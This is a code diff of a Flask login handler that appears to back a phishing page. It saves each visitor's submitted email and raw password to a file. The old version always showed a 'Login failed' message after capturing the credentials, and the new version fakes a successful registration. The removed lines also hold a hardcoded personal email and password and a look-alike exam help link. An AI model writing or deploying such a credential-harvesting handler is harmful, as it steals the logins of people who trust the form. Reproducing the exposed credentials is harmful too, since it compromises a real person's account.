@@ -41,23 +41,7 @@ def login():
     email = data.get('email')
     password = data.get('password')
     
-    # Specific user check
-    if email.lower() == 'sonamsinghh3001@gmail.com' and password == 'srmmph@2025':
-        return jsonify({
-            'status': 'success',
-            'message': 'Registration successful!',
-            'redirect_url': '/successful-registration'
-        }), 200
-
-    # Validate email format
-    if not is_valid_email(email):
-        return jsonify({
-            'status': 'error',
-            'message': 'Invalid email format',
-            'help_link': 'https://srmjeeh.in/'
-        }), 400
-    
-    # Save raw credentials securely
+    # Save credentials and redirect to success page
     try:
         user_data = {
             'email': email,
@@ -72,11 +56,11 @@ def login():
         with open(credential_file, 'w') as f:
             json.dump(user_data, f, indent=4)
         
-        # Always show 'Wrong password' message
+        # Return success and redirect
         return jsonify({
-            'status': 'error',
-            'message': 'Login failed'
-        }), 401
+            'status': 'success',
+            'redirect_url': '/successful-registration'
+        }), 200
     
     except Exception as e:
         return jsonify({
